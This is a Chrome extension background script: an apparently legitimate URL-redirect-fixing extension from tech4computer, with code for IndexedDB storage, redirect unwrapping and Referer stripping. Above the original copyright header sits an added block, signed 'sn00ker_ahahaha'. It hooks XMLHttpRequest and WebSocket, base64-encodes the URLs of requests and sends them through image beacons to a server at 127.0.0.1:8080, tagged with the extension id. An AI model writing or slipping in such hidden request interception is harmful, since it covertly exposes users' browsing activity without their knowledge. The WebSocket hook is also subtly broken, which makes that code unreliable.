function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
* Copyrights (c) 2011 - 2013 : @author tech4computer
* Released under the CONDITIONAL GPLv3 license with
* ADDITIONAL CONDITIONS THAT OVER RULES CONFLICTING
* PORTION OF GPLv3 ARE:
*  * Cannot commercially redistribute without author's permission.
*  * Cannot list on software directory listings without authors permission.
*  * Software news, blogs sites can publish articles about it. The article,
*    should contain links back pointing to the page where author hosted
*    the software.
*  * No derivative works - You may not alter, transform, or build upon this work.
*  * Attribution - You must attribute the work in the manner specified by the
*    author or licensor (but not in any way that suggests that they endorse
*    you or your use of the work)
*  * Cannot copy, modify and re-list the design layout, storage, human interaction concepts.
*  * Cannot copy, modify and re-list as separate Userscript on userscripts.org
*    or on Google Chrome Extensions listing.
*  * Cannot copy, modify and re-list as separate Firefox Addon on addons.mozilla.org
*  * Cannot copy, modify and re-list as separate Google Chrome Extension or App on
*    Google Chrome Extensions listing sites
*  * Cannot copy, modify and re-list as separate Safari Extension
*  * Cannot copy, modify and re-list as separate Browser Extension or Add-on or Plugin
*  * Cannot copy, modify and re-list as Web App, Mobile App
*  * Cannot copy, modify and re-list as plugin
*
* If anyone wants a feature added to it then make a suggestion
* to author and he will try his best to add it.
*
* Author blog: http://tech4computer.wordpress.com
**/
tabs={};
tbs=[];
tabIds=[];
pgAcTbs=[];
blkLst=[];
rfLst=[];
if(localStorage.getItem('md')===null || localStorage.getItem('md')===undefined){
localStorage.setItem('md',2);
}
if(localStorage.getItem('rf')===null || localStorage.getItem('rf')===undefined){
localStorage.setItem('rf',1);
}
var slmdkdb={};
slmdkdb.idb = {};
slmdkdb.idb.db = null;
slmdkdb.idb.v = 1;
if ('webkitIndexedDB' in window) {
window.indexedDB = window.webkitIndexedDB;
window.IDBTransaction = window.webkitIDBTransaction;
window.IDBKeyRange    = window.webkitIDBKeyRange;
} else if ('mozIndexedDB' in window) {
window.indexedDB = window.mozIndexedDB;
}
slmdkdb.idb.r = 'readonly';
slmdkdb.idb.rw = 'readwrite';
slmdkdb.idb.open = function() {
if(window.indexedDB==null || window.indexedDB==undefined){
return;
}
var request = window.indexedDB.open("fldb",slmdkdb.idb.v);
function crtDBStr(d){
var db = slmdkdb.idb.db;
try{
}catch(eDel){
}
if (!db.objectStoreNames.contains("d")){
var store = db.createObjectStore(
"d",
{keyPath: "id", autoIncrement: true}
);
store.onsuccess = function(eS){
};
store.onerror = function(eF){
};
store.onabort = function(eF){
};
store.createIndex("dm","dm",{unique:true});
store.createIndex("timestamp","timestamp",{unique:false});
}
if (!db.objectStoreNames.contains("rf")){
var rStore = db.createObjectStore(
"rf",
{keyPath: "id", autoIncrement: true}
);
rStore.onsuccess = function(eS){
};
rStore.onerror = function(eF){
};
rStore.onabort = function(eF){
};
rStore.createIndex("dm","dm",{unique:true});
rStore.createIndex("timestamp","timestamp",{unique:false});
}
}
;
modifyDBStr = function(d){
};
request.onsuccess = function(e) {
var v = slmdkdb.idb.v;
slmdkdb.idb.db = request.result;
var db = slmdkdb.idb.db;
request.result.onversionchange =function(e){
db.close();
};
if(v!= db.version) {
var vRqst = db.setVersion(v);
vRqst.onerror =function(eV){
};
vRqst.onblocked =function(eV){
};
vRqst.onsuccess = function(eS) {
slmdkdb.idb.db = request.result;
crtDBStr(request.result);
var vTrxn=eS.target.result;
vTrxn.onerror=function(eTrxn){
};
vTrxn.onabort=function(eTrxn){
};
vTrxn.oncomplete = function(eTrxn){
slmdkdb.idb.useDb();
};
};
}else{
slmdkdb.idb.useDb();
}
};
request.onerror = function(e){
};
request.onblocked = function(e){
};
request.onupgradeneeded = function(e){
slmdkdb.idb.db = request.result;
crtDBStr(request.result);
};
};
slmdkdb.idb.useDb = function() {
slmdkdb.idb.gtDLst({cmd:2});
slmdkdb.idb.gtRfDLst({cmd:2});
};
slmdkdb.idb.adD = function(msg) {
if(msg.rc==null || msg.rc==undefined) {
return;
}
var db = slmdkdb.idb.db;
if(!db.objectStoreNames.contains("d")){
return;
}
var trans = db.transaction( ["d"],slmdkdb.idb.rw);
trans.oncomplete = function(e){
if(null!=msg.cmd && msg.cmd!=undefined && msg.cmd==2){
}else{
}
slmdkdb.idb.gtDLst({cmd:2});
slmdkdb.idb.gtRfDLst({cmd:2});
};
trans.onerror = function(e){
};
var store = trans.objectStore("d");
try{
var timestamp=Date.now();
var request;
if(msg.ret!=null && msg.ret!=undefined && msg.ret!=0){
msg.rc.id=msg.ret;
request = store.put( msg.rc);
}else{
if(msg.rc.flg==null || msg.rc.flg==undefined){
msg.rc.flg=0;
}
request = store.add( msg.rc);
}
request.onsuccess = function(e) {
};
request.onerror = function(e) {
trans.abort();
};
}catch(er){
}
};
slmdkdb.idb.gtDLst = function(msg) {
var db = slmdkdb.idb.db;
if(!db.objectStoreNames.contains("d")){
return;
}
var trans = db.transaction(["d"], slmdkdb.idb.r);
var store = trans.objectStore("d");
var keyRange = IDBKeyRange.lowerBound(0);
var cursorRequest = store.openCursor(keyRange);
var lst=[];
cursorRequest.onsuccess = function(e) {
var result = e.target.result;
if(!!result == false){
msg.axn="";
if(msg!=null && msg!=undefined && msg.cmd!=null && msg.cmd!=undefined){
if(msg.cmd==1){
slmdkdb.idb.delAl(lst,"d");
}else if(msg.cmd==2){
blkLst=lst;
}
}
return;
}
if(result.value != null && result.value.dm!=null && result.value.dm!=undefined){
if(localStorage.getItem('md')==1){
if(result.value.flg==0){
lst.push( { "rc":result.value,"k":result.key} );
}
}else if(localStorage.getItem('md')==2){
if(result.value.flg==1){
lst.push( { "rc":result.value,"k":result.key} );
}
}else{
lst.push( { "rc":result.value,"k":result.key} );
}
}
result.continue();
};
cursorRequest.onerror = function(e){
};
};
slmdkdb.idb.adRfD = function(msg) {
if(msg.rc==null || msg.rc==undefined) {
return;
}
var db = slmdkdb.idb.db;
if(!db.objectStoreNames.contains("rf")){
return;
}
var trans = db.transaction( ["rf"],slmdkdb.idb.rw);
trans.oncomplete = function(e){
if(null!=msg.cmd && msg.cmd!=undefined && msg.cmd==2){
}else{
}
slmdkdb.idb.gtRfDLst({cmd:2});
};
trans.onerror = function(e){
};
var store = trans.objectStore("rf");
try{
var timestamp=Date.now();
var request;
if(msg.ret!=null && msg.ret!=undefined && msg.ret!=0){
msg.rc.id=msg.ret;
request = store.put( msg.rc);
}else{
request = store.add( msg.rc);
}
request.onsuccess = function(e) {
};
request.onerror = function(e) {
trans.abort();
};
}catch(er){
}
};
slmdkdb.idb.gtRfDLst = function(msg) {
var db = slmdkdb.idb.db;
if(!db.objectStoreNames.contains("rf")){
return;
}
var trans = db.transaction(["rf"], slmdkdb.idb.r);
var store = trans.objectStore("rf");
var keyRange = IDBKeyRange.lowerBound(0);
var cursorRequest = store.openCursor(keyRange);
var lst=[];
cursorRequest.onsuccess = function(e) {
var result = e.target.result;
if(!!result == false){
msg.axn="";
if(msg!=null && msg!=undefined && msg.cmd!=null && msg.cmd!=undefined){
if(msg.cmd==1){
slmdkdb.idb.delAl(lst,"rf");
}else if(msg.cmd==2){
rfLst=lst;
}
}
return;
}
if(result.value != null && result.value.dm!=null && result.value.dm!=undefined){
lst.push( { "rc":result.value,"k":result.key} );
}
result.continue();
};
cursorRequest.onerror = function(e){
};
};
slmdkdb.idb.delAl = function(lst,tbl) {
for(var r in lst){
slmdkdb.idb.del(lst[r].rc.id,tbl);
}
};
slmdkdb.idb.del = function(id,tbl){
var db = slmdkdb.idb.db;
var trans = db.transaction([tbl], slmdkdb.idb.rw);
trans.oncomplete = function(){
slmdkdb.idb.gtDLst({cmd:2});
slmdkdb.idb.gtRfDLst({cmd:2});
};
trans.onerror = function(e){
};
var request = trans.objectStore(tbl).delete(id);
request.onsuccess = function(e) {
};
request.onerror = function(e) {
};
};
function init() {
slmdkdb.idb.open();
}
window.addEventListener("DOMContentLoaded", init(), false);
chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
if(changeInfo && changeInfo.status && changeInfo.status.indexOf("complete")!=-1){
for(iTb in tabIds){
if(tabIds[iTb]==tabId){
tabIds.splice(iTb,1);
break;
}
}
for(jTb in tbs){
if(tbs[jTb].id==tabId){
var md=localStorage.getItem('md');
tbs.splice(jTb,1);
chrome.pageAction.show(tabId);
if(md==0){
chrome.pageAction.setIcon({path: "images/icon-dsbl16.png",tabId: tabId});
}else{
for(kTb in pgAcTbs){
if(pgAcTbs[kTb].id==tabId){
if(pgAcTbs[kTb].k==2){
chrome.pageAction.setIcon({path: "images/icon-off19.png",tabId: tabId});
}
break;
}
}
}
break;
}
}
}
});
chrome.tabs.onRemoved.addListener(function(tabId, inf){
for(iTb in tabIds){
if(tabIds[iTb]==tabId){
tabIds.splice(iTb,1);
break;
}
}
for(jTb in tbs){
if(tbs[jTb].id==tabId){
tbs.splice(jTb,1);
break;
}
}
for(kTb in pgAcTbs){
if(pgAcTbs[kTb].id==tabId){
pgAcTbs.splice(kTb,1);
break;
}
}
});
chrome.webRequest.onBeforeRequest.addListener(
function(inf){
if(inf.url.indexOf('chrome-extension:')==0){
return {cancel:false};
}
for(iTb in tabIds){
if(tabIds[iTb]==inf.tabId){
return {cancel:false};
}
}
var rgIgLg=/(login|logout|register|sign(in|on|off|out|up)|subscribe)/gim;
if(inf.url.search(rgIgLg)!=-1){
return {cancel:false};
}
var urlHost=( new URL(inf.url) ).host;
var rgHst=/(facebook|google|googleusercontent|pinterest|twitter|youtube|youtu.be|stumbleupon|reddit)/gim;
if(urlHost.search(rgHst)!=-1){
return {cancel:false};
}
var rgiext=/(rss|xml|odf|zip|exe)/gim;
if(inf.url.substring(inf.url.length-4).search(rgiext)!=-1){
return {cancel:false};
}
if(inf.url.lastIndexOf("http")>10){
var rUrl;
var ebl=0;
var md=localStorage.getItem('md');
var tid;
for(iDm in blkLst){
if(inf.url.indexOf(blkLst[iDm].rc.dm)!=-1){
if(md<2){
tabIds.push(inf.tabId);
tbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,tid:blkLst[iDm].k,k:2});
pgAcTbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,tid:blkLst[iDm].k,k:2});
return {cancel:false};
}else{
ebl=1;
tid=blkLst[iDm].k;
break;
}
}
}
if(md==2 && ebl==0){
tabIds.push(inf.tabId);
tbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,k:2});
pgAcTbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,k:2});
return {cancel:false};
}
var rgH=/(.)((http(s){0,1}%3A)|(http(s){0,1}:))/gim;
if(inf.url.search(rgH)>9){
rUrl=inf.url.substring(inf.url.search(rgH)+1);
if(rUrl.search(rgH)>9){
rUrl=rUrl.substring(rUrl.search(rgH)+1);
}
if(rUrl.search(rgH)>9){
rUrl=rUrl.substring(rUrl.search(rgH)+1);
}
}else{
rUrl=inf.url;
}
if(rUrl.indexOf("%")!=-1){
rUrl=unescape(rUrl);
}
if((rUrl.indexOf("?")==-1 && rUrl.toLowerCase().indexOf("%3f")==-1)){
var rg0=/(&|&amp;)/gim;
if(rUrl.search(rg0)!=-1){
rUrl=rUrl.replace(rg0,'?&');
}
}
if((rUrl.indexOf("?")==-1 && rUrl.toLowerCase().indexOf("%3f")==-1)){
var rg1=/(\/|%2f)(&|&amp;)/gim;
if(rUrl.search(rg1)!=-1){
rUrl=rUrl.replace(rg1,'/?&');
}
}
var tUrl=rUrl.substr(10);
var iamp=tUrl.indexOf('&');
if(iamp!=-1){
var rg2=/((\/|%2f)|(\?|%3f))/gim;
var ibkslsh=tUrl.search(rg2);
if(ibkslsh!=-1){
if(iamp<ibkslsh){
rUrl=rUrl.replace('&','?&');
}else{}
}else{
rUrl=rUrl.replace('&','?&');
}
}
tabIds.push(inf.tabId);
tbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,tid:tid,k:1});
pgAcTbs.push({id:inf.tabId,u0:inf.url,u1:rUrl,tid:tid,k:1});
if(localStorage.getItem('md')==0){
return {cancel:false};
}else{
return {redirectUrl:rUrl};
}
}
return {cancel:false};
},
{
urls: ["<all_urls>"],
types: ["main_frame"]
},
["blocking"]
);
chrome.webRequest.onBeforeSendHeaders.addListener(
function(details){
if(localStorage.getItem('rf')!=1 || localStorage.getItem('md')==0){
return {cancel:false};
}
for(var iDm=0;iDm<rfLst.length;iDm++){
if(details.url.indexOf(rfLst[iDm].rc.dm)!=-1){
return {cancel:false};
}
}
for(var i = 0; i < details.requestHeaders.length; ++i) {
if(details.requestHeaders[i].name === 'Referer'){
details.requestHeaders.splice(i, 1);
break;
}
}
return {requestHeaders: details.requestHeaders};
},
{urls: ["<all_urls>"]},
["blocking", "requestHeaders"]
);
chrome.webRequest.onResponseStarted.addListener(
function(inf){
if(Number(inf.statusCode)==404){
for(iTb in tbs){
if(tbs[iTb].id==inf.tabId){
if(localStorage.getItem('md')!=0){
chrome.tabs.update(inf.tabId,{"url":tbs[iTb].u0}, function(t){});
}
break;
}
}
}
},
{
urls: ["<all_urls>"],
types: ["main_frame"]
},
["responseHeaders"]
);
chrome.webRequest.onErrorOccurred.addListener(
function(inf){
for(iTb in tbs){
if(tbs[iTb].id==inf.tabId){
break;
}
}
},
{
urls: ["<all_urls>"],
types: ["main_frame"]
}
);
blg = function(){
try{
chrome.tabs.getSelected(null, function(tab) {
chrome.tabs.create({url:"http://tech4computer.wordpress.com/2012/05/22/fix-url-link-redirect-extension/",index:tab.index+1});
});
}catch(e){
}
};
opns = function(){
try{
chrome.tabs.getSelected(null, function(tab) {
chrome.tabs.create({url:"opns.html",index:tab.index+1});
});
}catch(e){
}
};
f5 = function(){
try{
slmdkdb.idb.gtDLst({cmd:2});
slmdkdb.idb.gtRfDLst({cmd:2});
rmAlTb();
}catch(e){
}
};
rmTb = function(tabId){
for(iTb in tabIds){
if(tabIds[iTb]==tabId){
tabIds.splice(iTb,1);
break;
}
}
for(jTb in tbs){
if(tbs[jTb].id==tabId){
tbs.splice(jTb,1);
break;
}
}
for(kTb in pgAcTbs){
if(pgAcTbs[kTb].id==tabId){
pgAcTbs.splice(kTb,1);
break;
}
}
chrome.pageAction.hide(tabId);
};
rmAlTb = function(){
for(kTb in pgAcTbs){
chrome.pageAction.hide(pgAcTbs[kTb].id);
}
tbs=[];
tabIds=[];
pgAcTbs=[];
blkLst=[];
rfLst=[];
};
rfChng=function(details){
if(details.value){
}else{
}
}
chrome.privacy.websites.referrersEnabled.onChange.addListener(rfChng);
chrome.privacy.websites.referrersEnabled.get({}, function(details) {
if (details.value){
}else{
}
});
